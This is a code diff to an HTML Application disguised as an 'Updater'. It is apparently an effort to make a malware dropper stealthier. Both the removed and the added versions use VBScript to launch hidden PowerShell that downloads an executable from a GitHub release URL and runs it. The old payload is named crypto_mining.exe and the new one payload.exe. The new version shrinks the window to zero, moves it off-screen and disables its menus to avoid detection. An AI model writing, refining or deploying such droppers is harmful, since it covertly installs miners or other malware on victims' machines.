@@ -1,17 +1,27 @@
 <hta:application
+  id="oHTA"
   applicationname="Updater"
   border="none"
   caption="no"
   showintaskbar="no"
-  windowstate="hidden" <!-- This hides the HTA window -->
+  windowstate="minimize"  <!-- Prevents flicker -->
+  singleinstance="yes"
+  navigable="no"
+  sysmenu="no"
+  contextmenu="no"
+  innerborder="no"
   scroll="no"
->
+/>
 
 <script language="VBScript">
-Set objShell = CreateObject("Wscript.Shell")
-' Run PowerShell silently and download and execute the payload
-objShell.Run "powershell -ExecutionPolicy Bypass -Command ""Start-Process 'powershell' -ArgumentList '-WindowStyle Hidden -ExecutionPolicy Bypass -Command ""$url='https://github.com/jozef800/discord/releases/download/v7.0/crypto_mining.exe';$out='$env:temp\scanner.exe';Invoke-WebRequest -Uri $url -OutFile $out;Start-Process $out""'""", 0, False
-Self.Close
-</script>
+  Window.resizeTo 0, 0  <!-- Ensure window is invisible -->
+  Window.moveTo -2000, -2000  <!-- Move off-screen -->
 
-</hta:application>
+  Set objShell = CreateObject("Wscript.Shell")
+  
+  ' Run PowerShell in a completely hidden way
+  objShell.Run "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command ""$url='https://github.com/jozef800/discord/releases/download/v7.0/payload.exe';$out='%temp%\payload.exe';(New-Object Net.WebClient).DownloadFile($url, $out);Start-Process -WindowStyle Hidden $out""", 0, False
+
+  ' Close HTA immediately
+  Self.Close()
+</script>
